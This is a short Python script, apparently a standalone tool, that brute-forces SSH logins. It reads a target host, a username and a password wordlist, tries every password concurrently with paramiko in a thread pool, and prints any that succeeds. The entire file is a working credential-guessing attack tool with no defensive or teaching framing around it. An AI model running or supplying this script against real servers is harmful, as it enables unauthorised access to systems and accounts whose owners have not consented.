#!/usr/bin/env python
import paramiko
import argparse
import threading
import concurrent.futures

class ConnectSsh():

    def __init__(self):
        self.parser = argparse.ArgumentParser(prog="sss_brute_forcer", description="brute force ssh service", epilog="./ssh_brute_force host -u username -w wordlist")
        self.parser.add_argument("host", type=str, help="Enter the host")
        self.parser.add_argument("-u", "--user", type=str, help="Enter the username")
        self.parser.add_argument("-w", "--wordlist", type=str, help="Enter the wordlist")
        self.args = self.parser.parse_args()
        self.host, self.user, self.wordlist = self.args.host, self.args.user, self.args.wordlist

    def connect(self, host, user, password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(host, username=user, password=password)
            print("Correct password: " + password)
        except paramiko.AuthenticationException:
            pass
        except paramiko.SSHException as ssh_ex:
            print("SSH error occurred: " + str(ssh_ex))
        except paramiko.SSHException as ex:
            print("An error occurred: " + str(ex))
        except Exception as e:
            print("An unexpected error occurred: " + str(e))
        finally:
            ssh.close()

    def start(self):
        with open(self.wordlist, "r") as file:
            with concurrent.futures.ThreadPoolExecutor() as executor: # Add ThreadPoolExecutor for threading
                for passwd in file:
                    passwd = passwd.strip("\n")
                    executor.submit(self.connect, self.host, self.user, passwd) # Submit the task to the executor


connect = ConnectSsh()
connect.start()